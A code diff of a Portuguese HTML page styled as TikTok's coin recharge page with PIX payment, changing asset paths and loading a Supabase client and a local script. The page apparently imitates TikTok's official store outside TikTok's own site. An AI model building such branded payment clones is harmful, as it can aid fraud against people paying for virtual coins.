@@ -5,8 +5,8 @@
 <meta charset="utf-8"/>
 <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes" name="viewport"/>
 <title>Moedas do TikTok: Compre e recarregue Moedas para enviar presentes. | TikTok</title>
-<link data-rh="true" href="../imagens/favicon.ico" rel="shortcut icon" type="image/x-icon"/>
-<link href="style.css" rel="stylesheet"/>
+<link data-rh="true" href="imagens/favicon.ico" rel="shortcut icon" type="image/x-icon"/>
+<link href="site/style.css" rel="stylesheet"/>
 
 </head>
 <body>
@@ -157,7 +157,7 @@
 <div class="payment-method">
 <div class="payment-icons" style="display: flex; align-items: center; gap: 12px;">
 <span class="label" style="font-weight: 600; font-size: 14px;">M&eacute;todo de pagamento</span>
-<img alt="PIX" src="../imagens/pix-logo-removebg-preview.png" style="height: 28px; width: auto; display: block;"/>
+<img alt="PIX" src="imagens/pix-logo-removebg-preview.png" style="height: 28px; width: auto; display: block;"/>
 </div>
 <p id="result"></p>
 <button class="btn-recharge" id="openButton">Recarregar</button>
@@ -193,7 +193,7 @@
 <div class="summary-payment">
 <span class="payment-label">Forma de pagamento</span>
 <div class="payment-value">
-<img alt="PIX" src="../imagens/pix-logo-removebg-preview.png"/>
+<img alt="PIX" src="imagens/pix-logo-removebg-preview.png"/>
 </div>
 </div>
 </div>
@@ -204,7 +204,7 @@
 <div class="popup-overlay popup-processing" id="popupProcessing">
 <div class="popup-box">
 <div class="processing-icon"><svg class="inline-icon" viewBox="0 0 24 24" fill="none" stroke="#f59e0b" stroke-width="1.8" aria-hidden="true"><path d="M6 4h12M6 20h12M8 4c0 4 3 5 4 6-1 1-4 2-4 6M16 4c0 4-3 5-4 6 1 1 4 2 4 6"/></svg></div>
-<div class="processing-title">Preparando pagamento</div>
+<div class="processing-title" id="processingTitle">Preparando pagamento</div>
 <div class="processing-spinner"></div>
 <div class="order-footer">Servi&ccedil;o de recarga de moedas virtual, r&aacute;pido e seguro</div>
 </div>
@@ -255,6 +255,7 @@
 <div class="pix-waiting"><svg class="inline-icon" viewBox="0 0 24 24" fill="none" stroke="#6b7280" stroke-width="1.8" aria-hidden="true"><path d="M6 4h12M6 20h12M8 4c0 4 3 5 4 6-1 1-4 2-4 6M16 4c0 4-3 5-4 6"/></svg> Após o pagamento, aguarde a confirmação</div>
 </div>
 </div>
-<script type="module" src="script.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+<script src="site/script.js"></script>
 </body>
 </html>
